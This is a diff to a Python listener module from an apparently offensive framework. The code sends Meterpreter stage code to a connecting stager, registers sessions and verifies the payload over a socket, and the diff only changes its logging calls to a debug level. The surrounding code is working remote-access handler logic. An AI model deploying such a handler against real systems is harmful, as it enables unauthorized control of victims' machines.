@@ -235,12 +235,12 @@ class Module(Listener):
                     # Send length (4 bytes big-endian) then stage code
                     length = struct.pack('>I', len(stage_bytes))
                     client_socket.sendall(length + stage_bytes)
-                    print_info(f"[DEBUG] Sent Meterpreter stage code ({len(stage_bytes)} bytes) to stager")
+                    print_debug(f"Sent Meterpreter stage code ({len(stage_bytes)} bytes) to stager")
                 else:
-                    print_warning("[DEBUG] Could not get stage code, stager may fail")
+                    print_debug("Could not get stage code, stager may fail")
                     # Try to continue anyway - maybe it's a direct connection
             except Exception as e:
-                print_warning(f"[DEBUG] Error sending stage code: {e}")
+                print_debug(f"Error sending stage code: {e}")
                 import traceback
                 traceback.print_exc()
                 # Continue anyway - maybe it's not a stager connection
@@ -259,7 +259,7 @@ class Module(Listener):
                 if payload_valid:
                     break
                 if attempt < 2:  # Don't print error on last attempt
-                    print_warning(f"[DEBUG] Payload verification attempt {attempt + 1} failed, retrying...")
+                    print_debug(f"Payload verification attempt {attempt + 1} failed, retrying...")
             
             if not payload_valid:
                 print_error("Payload verification failed - stage may have failed to execute")
@@ -289,14 +289,14 @@ class Module(Listener):
             
             if session_id:
                 print_success(f"Meterpreter session {session_id} opened!")
-                print_info(f"Session ID: {session_id}")
-                print_info(f"Target: {address[0]}:{address[1]}")
+                print_status(f"Session ID: {session_id}")
+                print_status(f"Target: {address[0]}:{address[1]}")
                 
                 # Verify socket is stored
                 if hasattr(self, '_session_connections') and session_id in self._session_connections:
-                    print_info(f"[DEBUG] Socket stored in _session_connections for session {session_id}")
+                    print_debug(f"Socket stored in _session_connections for session {session_id}")
                 else:
-                    print_warning(f"[DEBUG] Socket NOT found in _session_connections for session {session_id}")
+                    print_debug(f"Socket NOT found in _session_connections for session {session_id}")
                 
                 # Store session_id and signal that session was created
                 self.created_session_id = session_id
@@ -346,7 +346,7 @@ class Module(Listener):
                 client_socket.sendall(length + cmd_bytes)
             except (socket.error, OSError) as e:
                 error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
-                print_warning(f"[DEBUG] Payload verification: failed to send command (error {error_code}): {e}")
+                print_debug(f"Payload verification: failed to send command (error {error_code}): {e}")
                 client_socket.settimeout(original_timeout)
                 return False
             
@@ -358,20 +358,20 @@ class Module(Listener):
                 try:
                     chunk = client_socket.recv(4 - len(length_data))
                     if not chunk:
-                        print_warning("[DEBUG] Payload verification: connection closed while receiving length")
+                        print_debug("Payload verification: connection closed while receiving length")
                         client_socket.settimeout(original_timeout)
                         return False
                     length_data += chunk
                 except socket.timeout:
                     elapsed = time.time() - start_time
                     if elapsed > 10.0:
-                        print_warning("[DEBUG] Payload verification: timeout waiting for response length")
+                        print_debug("Payload verification: timeout waiting for response length")
                         client_socket.settimeout(original_timeout)
                         return False
                     continue
                 except (socket.error, OSError) as e:
                     error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
-                    print_warning(f"[DEBUG] Payload verification: socket error receiving length (error {error_code}): {e}")
+                    print_debug(f"Payload verification: socket error receiving length (error {error_code}): {e}")
                     client_socket.settimeout(original_timeout)
                     return False
             
@@ -379,7 +379,7 @@ class Module(Listener):
             
             # Validate response length
             if response_length > 10 * 1024 * 1024:  # 10MB max
-                print_warning(f"[DEBUG] Payload verification: response length too large: {response_length}")
+                print_debug(f"Payload verification: response length too large: {response_length}")
                 client_socket.settimeout(original_timeout)
                 return False
             
@@ -389,20 +389,20 @@ class Module(Listener):
                 try:
                     chunk = client_socket.recv(min(65536, response_length - len(response_data)))
                     if not chunk:
-                        print_warning(f"[DEBUG] Payload verification: connection closed while receiving response (got {len(response_data)}/{response_length})")
+                        print_debug(f"Payload verification: connection closed while receiving response (got {len(response_data)}/{response_length})")
                         client_socket.settimeout(original_timeout)
                         return False
                     response_data += chunk
                 except socket.timeout:
                     elapsed = time.time() - start_time
                     if elapsed > 10.0:
-                        print_warning(f"[DEBUG] Payload verification: timeout receiving response (got {len(response_data)}/{response_length})")
+                        print_debug(f"Payload verification: timeout receiving response (got {len(response_data)}/{response_length})")
                         client_socket.settimeout(original_timeout)
                         return False
                     continue
                 except (socket.error, OSError) as e:
                     error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
-                    print_warning(f"[DEBUG] Payload verification: socket error receiving response (error {error_code}): {e}")
+                    print_debug(f"Payload verification: socket error receiving response (error {error_code}): {e}")
                     client_socket.settimeout(original_timeout)
                     return False
             
@@ -411,23 +411,23 @@ class Module(Listener):
                 response = json.loads(response_data.decode('utf-8'))
                 # Check if we got a valid response (status 0 means success)
                 if response.get('status') == 0:
-                    print_info("[DEBUG] Payload verification: SUCCESS")
+                    print_debug("Payload verification: SUCCESS")
                     # Restore original timeout
                     client_socket.settimeout(original_timeout)
                     return True
                 else:
                     error_msg = response.get('error', 'Unknown error')
-                    print_warning(f"[DEBUG] Payload verification: got error status {response.get('status')}: {error_msg}")
+                    print_debug(f"Payload verification: got error status {response.get('status')}: {error_msg}")
                     client_socket.settimeout(original_timeout)
                     return False
             except json.JSONDecodeError as e:
-                print_warning(f"[DEBUG] Payload verification: invalid JSON response: {e}")
-                print_warning(f"[DEBUG] Response data (first 200 chars): {response_data[:200]}")
+                print_debug(f"Payload verification: invalid JSON response: {e}")
+                print_debug(f"Response data (first 200 chars): {response_data[:200]}")
                 client_socket.settimeout(original_timeout)
                 return False
                 
         except Exception as e:
-            print_warning(f"[DEBUG] Payload verification failed: {e}")
+            print_debug(f"Payload verification failed: {e}")
             import traceback
             traceback.print_exc()
             try:
